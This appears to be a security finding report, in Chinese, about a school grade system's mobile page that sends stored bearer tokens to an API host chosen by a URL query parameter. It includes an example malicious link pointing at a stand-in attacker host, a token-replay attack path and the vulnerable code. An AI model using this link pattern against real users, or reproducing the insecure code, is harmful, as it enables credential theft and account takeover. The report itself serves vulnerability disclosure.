# 18 查询参数指定API主机会泄露本地Bearer令牌

- 原标题：Query-selected API host leaks stored bearer tokens
- 云端级别：高危（High）
- 原始报告：[打开报告](https://chatgpt.com/codex/cloud/security/findings/1ce6598757808191b579c9ac8a379332?repo=https%3A%2F%2Fgithub.com%2FDalian-No-5-Middle-School-I-T-C%2FProject-X&sev=)
- 关联提交：[7287c94](https://github.com/Dalian-No-5-Middle-School-I-T-C/Project-X/commit/7287c945f715ddc22f13a32a85c8f2744d9de1e8)

- 页面时间：2026 年 6 月 20 日 08:52（原页面未注明时区）。
- 操作者：Tim-Hanchuan-Yang。

## 概要

本次提交修复了非安全性的 JavaScript 语法错误，却使安全问题变得可达。此前浏览器无法解析或执行内联脚本；四处引号修正后，脚本能够运行，原有的查询参数控制 API_BASE、读取 localStorage 令牌及自动认证初始化这一危险组合因而可以利用。

基线中的畸形字符串使整段脚本无法执行。修复四处问题后，初始化直接信任 URL 中的 api_base／apiBase，不验证来源。客户端从同源 localStorage 读取 px_token，在 DOMContentLoaded 时自动调用 API.me()；apiGet() 将令牌作为 Authorization 发送到 API_BASE。因此，未认证攻击者可向已登录用户发送类似 https://school.example/Grade-Analysis-System-mobile.html?api_base=https://attacker.example 的链接。攻击者端点允许 CORS 预检后，即可在 /api/auth/me 请求中收到 Bearer，随后在真实学校 API 重放，直到过期或撤销，以受害学生、教师或管理员权限访问和修改。教师或管理员身份尤其可能导致教育记录泄露，或成绩、账号被修改。API_BASE 必须限制为本源或明确可信的允许列表；Bearer 不应持久保存在 localStorage，也不应发送到查询参数选择的目标。

## 验证

1. 确认因果关系：全部相关引号修复使经典脚本可以解析和执行，而父版本仍不能执行。
2. 确认攻击者控制及缺少来源保护：api_base／apiBase 接受任意 HTTPS 来源，没有同源或允许列表验证。
3. 确认凭据来源及自动发送：已保存 px_token 在 DOMContentLoaded 时进入发往选定来源的 Authorization 请求，无需再次用户操作。
4. 确认现实可达性及影响前提：部署文档公开独立 URL，登录会持久保存令牌，后端接受可重放会话。
5. 完成端到端浏览器／CORS 捕获及真实部署令牌重放：由于浏览器库不可用，且没有在线受害实例，最后的集成步骤未完成。

### 验证输出结果

原页面提供验证输出入口；附件内容未包含在已归档的页面正文中。

## 证据注释

1. API_BASE 直接取自可控查询参数，localStorage 中的 Bearer 被附加到没有目标限制的 fetch。
2. API.me() 对应 apiGet('/api/auth/me')，提供自动跨源外泄请求。
3. 登录成功后有意将 px_token 保存在同源 localStorage，产生后续可泄露的凭据。
4. 第一处畸形字符串修复是使整段脚本可执行的一部分。
5. 第二处引号修复移除同一全局脚本的另一解析错误。
6. 第三处修复也是完整解析所必需的。
7. 最后一处修复使完整脚本可解析，并使转发令牌的初始化路径可达。
8. 每次页面加载时，只要存在已保存令牌及 API_BASE，初始化就自动调用 API.me()，把 Bearer 发往所选主机。

## 攻击路径分析

不适用强制排除：影响不限于本人，攻击者无需账号、本地访问、受保护写入或运维权限；文档中的公网部署及正常移动端登录使前提现实。工作人员令牌可以广泛访问机密性及完整性资产，因此影响高；远程攻击者只需构造链接、准备支持 CORS 的端点，并诱使在该页面 localStorage 中保存令牌的受害者点击一次，因此发生可能性高。矩阵得到高危，除非严重标准明确要求提升。这里仍依赖可选独立页面部署、精确来源上的有效令牌、用户交互及受害者角色足够高，因此保留高危。

### 路径

未认证远程攻击者准备构造链接及支持 CORS 的 HTTPS 端点 → 诱使用户打开同源恶意 URL → 已部署移动 HTML → DOMContentLoaded 自动调用 API.me() → apiGet('/api/auth/me') → 攻击者允许预检后发送 Authorization: Bearer → 攻击者 HTTPS 端点收到令牌 → 重放到 Project-X → Bearer 认证解析受害身份并应用其角色权限 → 获得学生、教师或管理员访问。

修复后的脚本在文档记载的移动流程中暴露凭据转发路径。页面直接从 api_base／apiBase 派生 API_BASE，读取 px_token，加载时自动调用 API.me()；apiGet 将它发往 API_BASE+'/api/auth/me'。目标由攻击者控制，可以自行允许预检并接收凭据。后端使用同一不透明令牌进行认证、解析身份和角色，因此可以重放，直到过期或撤销。仓库支持 Cloudflare／Nginx 公开部署，正常移动登录创建所需令牌。反向证据缩小范围但不否定问题：HTML 需要按文档复制部署；受害者必须点击，并在精确来源上保留有效移动令牌；只使用主客户端 HttpOnly Cookie 的用户不受影响。后端角色授权仍然有效，但会把重放者当成受害者，只按受害权限限制后果，不能阻止利用。

## 发生可能性

高。攻击者远程且未认证，唯一输入是可控 URL；目标由攻击者拥有，因此可以满足 CORS。一次点击后自动发送。文档明确记载公开部署该文件，正常登录保存 px_token，因此前提现实。可选复制部署、精确来源、普通八小时过期及仅使用 Cookie 的用户不受影响，会缩小范围，但不要求攻击者拥有运维、开发、本地或高权限。攻击向量为远程网络。

## 影响程度

高。暴露的是可重放认证凭据，不只是个人资料。令牌映射到受害者身份及角色，教师或管理员失陷可使未认证攻击者取得特权身份，披露教育记录，或执行该角色有权进行的成绩、用户及配置修改。影响取决于角色和令牌剩余寿命，但工作人员是现实用户。

## 假设条件

- 使用文档中的移动 HTML 部署，学校入口或公共隧道可达。
- 受害者曾通过该页面登录，精确来源的 localStorage 保留有效 px_token。
- 受害者打开带 api_base／apiBase、但没有覆盖 token 参数的恶意链接。
- 攻击者 HTTPS 端点在预检中允许页面来源及 Authorization。
- 重放发生在正常过期或撤销之前。

原文另列前提：

- 独立移动 HTML 部署在受害者可访问的来源。
- 页面同源 localStorage 中存在其保存的有效 px_token。
- 用户点击通过 api_base／apiBase 选择攻击者端点的链接。
- 攻击者端点允许预检及 Authorization。
- 捕获和重放时令牌未过期、未撤销。

## 控制措施

- 使用 32 字节密码学随机不透明令牌，而非可预测 ID。
- 普通非持久令牌八小时后过期，可通过退出、重置密码或后端撤销失效。
- 移动端退出会删除 localStorage 中的 px_token。
- 后端认证及权限将重放效果限制在受害者权限内。
- Authorization 触发 CORS 预检，但目标由攻击者控制，可以允许，因此不能阻止这条路径。
- Node 绑定回环地址，文档支持 Cloudflare／Nginx 公开访问。
- 独立页面需要复制部署，不会自动包含在该版本 dist/client 中。
- 只使用主客户端 HttpOnly Cookie，且移动页面来源没有 px_token 的用户，不满足前提。
- 未发现该页面采用限制性 connect-src CSP 或 API 来源验证。

## 盲点

- 此静态阶段没有执行在线部署或完整浏览器、攻击端、Project-X 重放链；可执行框架证明了仓库脚本选择的目标及 Authorization。
- 文档支持公开部署，但不能确定哪些实例实际复制并公开独立 HTML。
- 不知道使用移动登录而非主 Cookie 客户端的用户数量及角色分布。
- 正确 CORS 响应由攻击者控制，但没有完成浏览器验证。
- 广泛工作人员后果由令牌身份及权限推导，没有对全部特权操作逐端点重放。
- 仓库之外的代理响应头或 CSP 可能降低可利用性，但没有确立强制控制。

## 证据代码

文件名后的数字是该片段在报告所关联提交中的首行行号；不连续的片段分别列出。

### [Grade-Analysis-System-mobile.html:191](https://github.com/Dalian-No-5-Middle-School-I-T-C/Project-X/blob/7287c945f715ddc22f13a32a85c8f2744d9de1e8/Grade-Analysis-System-mobile.html#L191)

~~~~text
const urlParams = new URLSearchParams(location.search);
const API_BASE = (urlParams.get('api_base') || urlParams.get('apiBase') || '').replace(/\/$/, '');
let apiMode = urlParams.get('demo') === '1' ? 'demo' : 'live';
let authToken = urlParams.get('token') || localStorage.getItem('px_token') || null;
let currentUser = null;
let currentRole = null;
let currentStudent = null;
let appData = { exams: [], students: [], scores: [], classes: [] };
let charts = {};
let isWeixinWebView = false;
let studentCache = new Map();
try { if (window.__wxjs_environment === 'miniprogram' || /miniProgram/.test(navigator.userAgent)) { isWeixinWebView = true; } } catch(e) {}

// ==================== HTTP 工具 ====================
async function apiGet(path) {
  if (apiMode === 'demo') throw new Error('DEMO_MODE');
  const headers = authToken ? { 'Authorization': 'Bearer ' + authToken } : {};
  const res = await fetch(API_BASE + path, { headers });
~~~~

### [Grade-Analysis-System-mobile.html:239](https://github.com/Dalian-No-5-Middle-School-I-T-C/Project-X/blob/7287c945f715ddc22f13a32a85c8f2744d9de1e8/Grade-Analysis-System-mobile.html#L239)

~~~~text
const API = {
  login: (u, p) => apiPost('/api/auth/login', { identifier: u, password: p }),
  me: () => apiGet('/api/auth/me'),
  getExams: () => apiGet('/api/exams'),
~~~~

### [Grade-Analysis-System-mobile.html:591](https://github.com/Dalian-No-5-Middle-School-I-T-C/Project-X/blob/7287c945f715ddc22f13a32a85c8f2744d9de1e8/Grade-Analysis-System-mobile.html#L591)

~~~~text
  if (apiMode === 'live') {
    try {
      const res = await API.login(username, password);
      authToken = res.token;
      if (res.token) localStorage.setItem('px_token', res.token);
      const me = await API.me();
~~~~

### [Grade-Analysis-System-mobile.html:663](https://github.com/Dalian-No-5-Middle-School-I-T-C/Project-X/blob/7287c945f715ddc22f13a32a85c8f2744d9de1e8/Grade-Analysis-System-mobile.html#L663)

~~~~text
  bar.innerHTML = items.map(it => '<div class="tab-item" data-section="'+it.id+'" onclick="showSection(\''+it.id+'\')"><span class="tab-icon">'+it.icon+'</span><span>'+it.label+'</span></div>').join('');
~~~~

### [Grade-Analysis-System-mobile.html:712](https://github.com/Dalian-No-5-Middle-School-I-T-C/Project-X/blob/7287c945f715ddc22f13a32a85c8f2744d9de1e8/Grade-Analysis-System-mobile.html#L712)

~~~~text
  nav.innerHTML = items.map(it => '<div class="sidebar-item px-6 py-3 flex items-center gap-3 text-sm font-medium text-slate-600" onclick="showSection(\''+it.id+'\')" data-section="'+it.id+'"><span class="text-lg">'+it.icon+'</span><span>'+it.label+'</span></div>').join('');
~~~~

### [Grade-Analysis-System-mobile.html:742](https://github.com/Dalian-No-5-Middle-School-I-T-C/Project-X/blob/7287c945f715ddc22f13a32a85c8f2744d9de1e8/Grade-Analysis-System-mobile.html#L742)

~~~~text
    content.innerHTML = '<div class="text-center text-red-500 p-8">加载失败: ' + e.message + '<br><button onclick="showSection(\''+sectionId+'\')" class="mt-4 px-4 py-2 bg-blue-600 text-white rounded-lg text-sm">重试</button></div>';
~~~~

### [Grade-Analysis-System-mobile.html:911](https://github.com/Dalian-No-5-Middle-School-I-T-C/Project-X/blob/7287c945f715ddc22f13a32a85c8f2744d9de1e8/Grade-Analysis-System-mobile.html#L911)

~~~~text
    '<td class="px-6 py-4"><button onclick="showStudentDetail(\'' + stu.studentId + '\')" class="text-blue-600 hover:text-blue-800 text-sm font-medium">详情</button></td>' +
~~~~

### [Grade-Analysis-System-mobile.html:1550](https://github.com/Dalian-No-5-Middle-School-I-T-C/Project-X/blob/7287c945f715ddc22f13a32a85c8f2744d9de1e8/Grade-Analysis-System-mobile.html#L1550)

~~~~text
document.addEventListener('DOMContentLoaded', async () => {
  if (authToken && API_BASE) {
    try {
      const me = await API.me();
      currentUser = me;
~~~~
